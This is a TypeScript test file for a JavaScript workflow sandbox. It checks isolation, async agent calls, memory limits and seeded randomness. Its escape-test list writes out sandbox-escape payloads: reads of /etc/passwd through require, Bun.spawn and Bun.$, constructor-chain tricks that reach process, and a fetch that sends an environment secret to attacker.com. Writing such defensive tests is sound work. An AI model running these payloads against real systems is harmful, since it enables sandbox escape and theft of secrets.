// SPDX-License-Identifier: MIT
// @sffmc/runtime — see ../../LICENSE

import { describe, test, expect } from "bun:test"
import { runSandboxed, type SandboxPrimitives } from "../../workflow/src/sandbox"

// ---------------------------------------------------------------------------
// Dummy primitives — none of the escape tests should call them.
// If any escape test succeeds in calling a host function, it already
// proves an escape. The actual values returned are irrelevant.
// ---------------------------------------------------------------------------

function dummyPrimitives(): SandboxPrimitives {
  return {
    agent: async () => null,
    parallel: async () => [],
    pipeline: async () => [],
    workflow: async () => null,
    phase: () => { },
    log: () => { },
    readFile: async () => null,
    writeFile: async () => { },
    glob: async () => [],
    exists: async () => false,
    args: null,
  }
}

// ---------------------------------------------------------------------------
// Capturing primitives for the basic / async / error tests
// ---------------------------------------------------------------------------

function capturingPrimitives() {
  const logLines: string[] = []
  const agents: unknown[] = []
  let phaseCalled: string | null = null
  return {
    primitives: {
      agent: async (task: string) => { agents.push(task); return { ok: true } },
      parallel: async () => [],
      pipeline: async () => [],
      workflow: async () => null,
      phase: (title: string) => { phaseCalled = title },
      log: (msg: string) => { logLines.push(msg) },
      readFile: async () => null,
      writeFile: async () => { },
      glob: async () => [],
      exists: async () => false,
      args: null,
    } satisfies SandboxPrimitives,
    logLines,
    agents,
    phaseCalled,
  }
}

// ---------------------------------------------------------------------------
// 12 Escape Tests
// ---------------------------------------------------------------------------

const ESCAPE_TESTS: Array<{ name: string; code: string }> = [
  {
    name: "fs require",
    code: `try { require("fs").readFileSync("/etc/passwd","utf8") } catch(e) { String(e) }`,
  },
  {
    name: "process binding",
    code: `try { process.binding("fs").open("/etc/passwd") } catch(e) { String(e) }`,
  },
  {
    name: "Bun.file",
    code: `try { (typeof Bun !== "undefined" ? Bun : {file:()=>{}}).file("/etc/passwd").text() } catch(e) { String(e) }`,
  },
  {
    name: "fetch exfil",
    code: `try { fetch("https://attacker.com/?d="+(typeof process!=="undefined"?process.env?.SECRET:"")) } catch(e) { String(e) }`,
  },
  {
    name: "Bun.spawn",
    code: `try { (typeof Bun !== "undefined" ? Bun : {}).spawn(["cat","/etc/passwd"]) } catch(e) { String(e) }`,
  },
  {
    name: "Bun.$",
    code: `try { (typeof Bun !== "undefined" ? Bun : {}).$\`cat /etc/passwd\` } catch(e) { String(e) }`,
  },
  {
    name: "proto walk",
    code: `try { this.constructor.constructor("return process")().exit() } catch(e) { String(e) }`,
  },
  {
    name: "eval",
    code: `try { eval("require('fs')") } catch(e) { String(e) }`,
  },
  {
    name: "Function ctor",
    code: `try { (new Function("return process"))().exit() } catch(e) { String(e) }`,
  },
  {
    name: "dynamic import",
    code: `try { import("fs").then(m => m.readFileSync("/etc/passwd","utf8")) } catch(e) { String(e) }`,
  },
  {
    name: "globalThis",
    code: `try { globalThis.process?.exit?.() } catch(e) { String(e) }`,
  },
  {
    name: "throw escape",
    code: `try { (function(){try{throw 1}catch(e){return e.constructor.constructor("return this")()}})() } catch(e) { String(e) }`,
  },
]

describe("sandbox escape tests", () => {
  for (const { name, code } of ESCAPE_TESTS) {
    test(`blocks ${name}`, async () => {
      const result = await runSandboxed(code, dummyPrimitives())

      // Acceptable: error string (guest caught and converted), null (host
      // caught an unhandled guest throw), or undefined.
      // Unacceptable: actual file contents indicating escape.
      if (typeof result === "string") {
        expect(result).not.toContain("root:")
        expect(result).not.toMatch(/BEGIN RSA PRIVATE/)
      } else {
        expect(result).toBeFalsy() // null or undefined
      }
    })
  }
})

// ---------------------------------------------------------------------------
// 4 Functional Tests
// ---------------------------------------------------------------------------

describe("sandbox functional tests", () => {
  test("evaluates basic expression", async () => {
    const { primitives, logLines } = capturingPrimitives()

    const result = await runSandboxed(
      `log("hello"); return 1 + 1`,
      primitives,
    )

    expect(result).toBe(2)
    expect(logLines).toContain("hello")
  })

  test("handles async agent call", async () => {
    const { primitives, agents } = capturingPrimitives()

    const result = await runSandboxed(
      `const res = await agent("test task"); return "done"`,
      primitives,
    )

    expect(result).toBe("done")
    expect(agents.length).toBe(1)
    expect(agents[0]).toBe("test task")
  })

  test("returns null on script error (never-throw)", async () => {
    const result = await runSandboxed(
      `throw new Error("boom")`,
      dummyPrimitives(),
    )

    expect(result).toBeNull()
  })

  test("handles memory limit gracefully", async () => {
    // Allocate a massive string — each concatenation doubles the string,
    // rapidly blowing past the 2 MB limit. 26 iterations = 2^26 = 67 MB.
    const result = await runSandboxed(
      `let s = "x"; for (let i = 0; i < 30; i++) s += s; return s.length`,
      dummyPrimitives(),
      { memoryMB: 2, deadlineMs: 10_000 },
    )

    // Memory exhaustion should cause the sandbox to fail; never-throw
    // contract means we get null.
    expect(result).toBeNull()
  })

  test("runs seeded Math.random deterministically", async () => {
    const script = `return Math.random()`

    const a = await runSandboxed(script, dummyPrimitives(), { seed: 42 })
    const b = await runSandboxed(script, dummyPrimitives(), { seed: 42 })
    const c = await runSandboxed(script, dummyPrimitives(), { seed: 99 })

    // Same seed → same output
    expect(a).toBe(b)
    // Different seed → likely (but not guaranteed) different output
    expect(typeof a).toBe("number")
    expect(typeof c).toBe("number")
  })

  test("injects args as guest global", async () => {
    const primitives = { ...dummyPrimitives(), args: { hello: "world" } }

    const result = await runSandboxed(
      `return args.hello`,
      primitives,
    )

    expect(result).toBe("world")
  })

  test("parallel guest-side helper works", async () => {
    const { primitives, logLines } = capturingPrimitives()

    const result = await runSandboxed(
      `const results = await parallel([
        () => { log("a"); return 1 },
        () => { log("b"); return 2 },
        () => { log("c"); return 3 },
      ]);
      return results.reduce((a,b) => a+b, 0)`,
      primitives,
    )

    expect(result).toBe(6)
    expect(logLines).toContain("a")
    expect(logLines).toContain("b")
    expect(logLines).toContain("c")
  })

  test("pipeline guest-side helper works", async () => {
    const result = await runSandboxed(
      `const items = [1, 2, 3];
      const results = await pipeline(
        items,
        (acc, item) => acc + item * 10,
        (acc, item) => acc + item,
      );
      return results`,
      dummyPrimitives(),
    )

    // pipeline: for each item [1,2,3]:
    //   start: Promise.resolve(item) → 1, 2, 3
    //   stage 1: (prev, item, i) → prev + item*10 → 1+10=11, 2+20=22, 3+30=33
    //   stage 2: (prev, item, i) → prev + item → 11+1=12, 22+2=24, 33+3=36
    expect(result).toEqual([12, 24, 36])
  })

  test("URL guest-side helper is available", async () => {
    const result = await runSandboxed(
      `const u = new URL("https://example.com/path?q=1#hash");
      return { host: u.host, pathname: u.pathname, toString: u.toString() }`,
      dummyPrimitives(),
    )

    expect(result).toEqual({
      host: "example.com",
      pathname: "/path",
      toString: "https://example.com/path?q=1#hash",
    })
  })
})
